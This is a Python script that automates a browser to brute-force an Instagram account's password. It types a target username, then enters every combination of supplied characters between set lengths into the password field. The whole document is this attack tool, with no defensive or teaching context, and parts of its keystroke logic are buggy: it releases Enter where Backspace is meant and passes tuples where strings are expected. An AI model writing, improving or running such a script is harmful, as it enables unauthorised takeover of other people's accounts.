from webbot import Browser
from pynput.keyboard import Key, Controller
import time
import sys
from itertools import product

def parseStringToArray(str):
    print(str)
    for i in str:
        print(i)
        bruteforce.append(i)

params = sys.argv
print(params)
username = params[1]
min = int(params[2])
maxx = int(params[3])

bruteforce = []
chars_list = params[4]
parseStringToArray(chars_list)

web = Browser()
keyboard = Controller()

web.go_to('www.instagram.com')
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type(username, into="username")
keyboard.press(Key.tab)
keyboard.release(Key.tab)
caracteres = bruteforce
minn = min
while minn <= maxx:
    genComb = product(caracteres, repeat=minn)
    for subset in genComb:
        web.type(subset, into="password")
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)
        for x in range(minn):
            keyboard.press(Key.backspace)
            keyboard.release(Key.enter)
    minn += 1
